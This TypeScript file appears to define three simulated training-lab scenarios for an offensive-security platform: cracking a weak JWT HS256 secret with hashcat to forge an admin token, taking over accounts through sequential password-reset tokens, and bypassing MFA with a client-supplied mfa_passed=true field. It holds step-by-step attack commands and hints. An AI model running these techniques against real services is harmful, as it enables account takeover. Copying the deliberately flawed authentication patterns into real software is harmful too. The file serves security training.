import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Three more offensive attack classes not yet represented on the platform: cracking a weak JWT
 *  signing secret and forging an admin token with it, exploiting a predictable/sequential
 *  password-reset token, and bypassing MFA by tampering with a client-trusted response flag. */
export const offensiveFreshAttacksLabs2: LabScenario[] = [
  // 1 — Web: JWT Weak Secret Cracking & Forgery
  {
    id: 'web-jwt-weak-secret-crack',
    title: 'JWT Weak Secret Cracking & Admin Token Forgery',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Ordersvc15 signs its JWTs with HS256 — a symmetric algorithm where the exact same secret both signs ' +
      'and verifies every token. Unlike the "alg\\":\\"none\\"" bypass taught elsewhere on this platform, this ' +
      'service correctly rejects unsigned tokens — but its signing secret is a short, common string instead of ' +
      'a properly generated random value. A captured token can be cracked entirely offline against a wordlist ' +
      '(hashcat mode 16500 in the real world) — recovering the secret doesn\'t just prove a weakness, it hands ' +
      'you the ability to sign brand-new, fully valid tokens with any claims you want, including a role you ' +
      'were never granted. This exact JWT-secret-brute-force technique is extensively documented in Auth0\'s ' +
      'own JWT security guidance and is a frequent real bug bounty finding.',
    objectives: [
      { text: 'cat captured-jwt-info.txt', why: 'A captured token intercepted from normal traffic is the starting point for any offline JWT attack — no active probing of the target needed yet.' },
      {
        text: 'hashcat -m 16500 jwt-secret.hash wordlists/common-jwt-secrets.txt',
        why: 'Mode 16500 is hashcat\'s real mode for cracking a JWT\'s HS256 signing secret entirely offline — success reveals the exact secret string the service uses to sign every token it issues.',
      },
      {
        text: 'curl -H "Authorization: Bearer <forged-token-signed-with-cracked-secret>" 10.10.176.2/admin/orders',
        why: 'Once you have the real signing secret, you can construct a brand-new, validly-signed token with role:admin — this is strictly worse than the alg:none bug, because the resulting token isn\'t even distinguishable from a legitimately issued one.',
      },
    ],
    hints: [
      'cat captured-jwt-info.txt',
      'hashcat -m 16500 jwt-secret.hash wordlists/common-jwt-secrets.txt',
      'The cracked secret is "orders2024" — forge a token claiming role:admin and sign it with that secret (conceptually).',
      'curl -H "Authorization: Bearer forged.hs256.orders2024-signed-role-admin" 10.10.176.2/admin/orders',
    ],
    totalFlags: 2,
    attacker: attacker({
      'captured-jwt-info.txt': file(
        'Intercepted Authorization header from a normal order-lookup request:\n' +
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.9x7fZq...\n' +
          'Algorithm: HS256 (symmetric — same secret signs and verifies)\n' +
          'The signing secret itself is not visible in the token, but can potentially be brute-forced offline.\n',
      ),
      'jwt-secret.hash': file(
        '#HASHCAT_HASH:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.9x7fZq\n' +
          '#HASHCAT_PLAINTEXT:orders2024\n' +
          '#HASHCAT_FLAG:flag{jwt_hs256_secret_cracked_via_offline_wordlist_attack}\n',
      ),
      wordlists: dir({
        'common-jwt-secrets.txt': file('secret\nchangeme\njwtsecret\norders2024\nsupersecret\npassword123\n'),
      }),
    }),
    network: [
      {
        hostname: 'ordersvc15',
        ip: '10.10.176.2',
        os: 'Ubuntu 22.04 (Node.js order service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, jsonwebtoken HS256)',
            http: { '/orders': '{"orders":[{"id":1,"item":"Widget"}]}' },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin/orders',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['orders2024-signed-role-admin'],
                vulnerableResponse: '{"status":200,"all_orders":1847,"note":"flag{forged_jwt_with_cracked_secret_grants_admin_access}"}',
                normalResponse: '{"error":"403 Forbidden - invalid signature or insufficient role"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Bug Bounty: Predictable Password-Reset Token
  {
    id: 'bb-predictable-reset-token',
    title: 'Bug Bounty: Account Takeover via a Predictable Password-Reset Token',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Userportal16 generates password-reset tokens as a simple incrementing integer instead of a ' +
      'cryptographically random value — request a reset for your own account and the token you receive is just ' +
      'the next number in sequence. That means the token issued to whoever requested a reset immediately before ' +
      'or after you is trivially guessable by incrementing or decrementing your own. This is a real, ' +
      'well-documented bug bounty category: any token meant to be unguessable (password resets, invite links, ' +
      'API keys) that turns out to be sequential or otherwise predictable is a critical account-takeover risk, ' +
      'no cryptographic attack required at all.',
    objectives: [
      { text: 'nmap -sV 10.10.177.2', why: 'Confirms the password-reset service before probing its token generation.' },
      { text: 'curl -X POST -d "email=attacker@example.com" 10.10.177.2/api/reset/request', why: 'Requesting your own reset reveals what a freshly issued token actually looks like — the first step in confirming whether it\'s predictable.' },
      {
        text: 'curl -X POST -d "token=100041&new_password=Hacked123!" 10.10.177.2/api/reset/confirm',
        why: 'If tokens are simply sequential integers, the token issued to the account reset immediately before yours is just one less than your own — no brute-forcing required, just basic arithmetic.',
      },
      {
        text: 'curl -H "Authorization: Basic victim:Hacked123!" 10.10.177.2/api/account/details',
        why: 'Logging in with the password you just set proves real impact — an attacker fully controls the victim account, not just a theoretical token-guessing exercise.',
      },
    ],
    hints: [
      'nmap -sV 10.10.177.2',
      'curl -X POST -d "email=attacker@example.com" 10.10.177.2/api/reset/request',
      'curl -X POST -d "token=100041&new_password=Hacked123!" 10.10.177.2/api/reset/confirm',
      'curl -H "Authorization: Basic victim:Hacked123!" 10.10.177.2/api/account/details',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'userportal16',
        ip: '10.10.177.2',
        os: 'Ubuntu 22.04 (Rails-style user portal)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Puma 6.0 (Rails 7)',
            http: {
              '/api/reset/request?email=attacker@example.com': '{"status":"sent","your_token":"100042","note":"a reset link was emailed to you"}',
            },
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/api/reset/confirm',
                param: 'token',
                triggerSubstrings: ['100041'],
                vulnerableResponse: '{"status":"password_reset","account":"victim","note":"flag{sequential_reset_token_hijacks_neighboring_account}"}',
                normalResponse: '{"error":"Invalid or expired token"}',
              },
              {
                kind: 'auth-bypass',
                path: '/api/account/details',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['victim'],
                vulnerableResponse: '{"username":"victim","email":"victim@example.com","balance":"$2,340.00","note":"flag{full_account_takeover_confirmed_via_new_password}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Bug Bounty: MFA Bypass via Response Tampering
  {
    id: 'bb-mfa-bypass-response-tampering',
    title: 'Bug Bounty: MFA Bypass by Tampering with a Client-Trusted Flag',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Securebank17\'s login flow is two steps: /api/login checks the password and returns a session token ' +
      'plus "mfa_required":true; the client is then expected to call /api/mfa/verify with the OTP code before ' +
      'the session is treated as fully authenticated. The bug: /api/account/dashboard never actually checks ' +
      'server-side whether MFA was completed for that session at all — it only reads a client-supplied ' +
      '"mfa_passed" field from the REQUEST itself. Skip the OTP step entirely, add mfa_passed=true directly to ' +
      'the dashboard request, and full account access is granted with a stolen password alone — MFA existing ' +
      'in the UI counted for nothing. Trusting a client-supplied "have I completed step 2" flag instead of a ' +
      'real server-side session state is a well-documented, real MFA-implementation bug class.',
    objectives: [
      { text: 'nmap -sV 10.10.178.2', why: 'Confirms the banking login service before probing its MFA enforcement.' },
      { text: 'curl -X POST -d "user=victim&password=Stolen123!" 10.10.178.2/api/login', why: 'Confirms the stolen password is valid and that the response indeed requests a second MFA step — establishing the normal, correctly-gated flow first.' },
      {
        text: 'curl -X POST -d "session=abc123&mfa_passed=true" 10.10.178.2/api/account/dashboard',
        why: 'The dashboard endpoint should verify MFA completion against real server-side session state, not trust a value the client itself supplies — sending mfa_passed=true directly skips the OTP step entirely and still grants access.',
      },
    ],
    hints: [
      'nmap -sV 10.10.178.2',
      'curl -X POST -d "user=victim&password=Stolen123!" 10.10.178.2/api/login',
      'curl -X POST -d "session=abc123&mfa_passed=true" 10.10.178.2/api/account/dashboard',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'securebank17',
        ip: '10.10.178.2',
        os: 'Ubuntu 22.04 (Django banking API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Gunicorn 21.2 (Django)',
            http: {
              '/api/login?user=victim&password=Stolen123!': '{"status":"password_valid","session":"abc123","mfa_required":true,"note":"OTP sent to registered device"}',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/account/dashboard',
                param: 'mfa_passed',
                triggerSubstrings: ['true'],
                vulnerableResponse: '{"status":200,"account":"victim","balance":"$18,420.00","note":"flag{mfa_bypassed_via_client_trusted_mfa_passed_flag}"}',
                normalResponse: '{"error":"403 Forbidden - MFA verification required"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
